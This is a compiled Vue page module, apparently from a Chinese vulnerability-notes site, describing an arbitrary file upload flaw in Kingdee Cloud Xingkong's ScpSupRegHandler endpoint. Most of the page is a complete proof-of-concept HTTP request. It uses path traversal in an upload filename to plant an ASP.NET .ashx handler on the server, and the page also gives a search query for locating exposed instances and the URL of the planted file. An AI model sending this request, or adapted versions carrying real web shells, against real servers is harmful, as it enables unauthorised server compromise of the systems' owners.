import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as n,c as i,e as a}from"./app-58e4a7d6.js";const d={},s=a(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>金蝶OA 云星空 ScpSupRegHandler 接口存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件获取服务器权限</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><p>金蝶OA 云星空</p><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;金蝶云星空-管理中心&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登陆页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20231116140635693.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>poc</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /k3cloud/SRM/ScpSupRegHandler HTTP/1.1
Host: 
Accept-Encoding: identity
Content-Length: 973
Accept-Language: zh-CN,zh;q=0.8
Accept: */*
Cache-Control: max-age=0
Content-Type: multipart/form-data; boundary=2ac719f8e29343df94aa4ab49e456061

--2ac719f8e29343df94aa4ab49e456061
Content-Disposition: form-data; name=&quot;dbId_v&quot;

.
--2ac719f8e29343df94aa4ab49e456061
Content-Disposition: form-data; name=&quot;FID&quot;

2022
--2ac719f8e29343df94aa4ab49e456061
Content-Disposition: form-data; name=&quot;FAtt&quot;; filename=&quot;../../../../uploadfiles/test.ashx.&quot;
Content-Type: text/plain

&lt;%@ WebHandler Language=&quot;C#&quot; Class=&quot;TestHandler&quot; %&gt;
        using System;
        using System.Web;
        public class TestHandler : IHttpHandler {
            public void
            ProcessRequest (HttpContext context) {
                context.Response.ContentType= &quot;text/plain&quot;;
                context.Response.Write(&quot;Test&quot;);
            }
            public bool IsReusable {
                get {return false; }
            }
        }
--2ac719f8e29343df94aa4ab49e456061--
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20231116140545666.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/K3Cloud/uploadfiles/Test.ashx
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,13),t=[s];function l(r,c){return n(),i("div",null,t)}const v=e(d,[["render",l],["__file","金蝶OA 云星空 ScpSupRegHandler 任意文件上传漏洞.html.vue"]]);export{v as default};
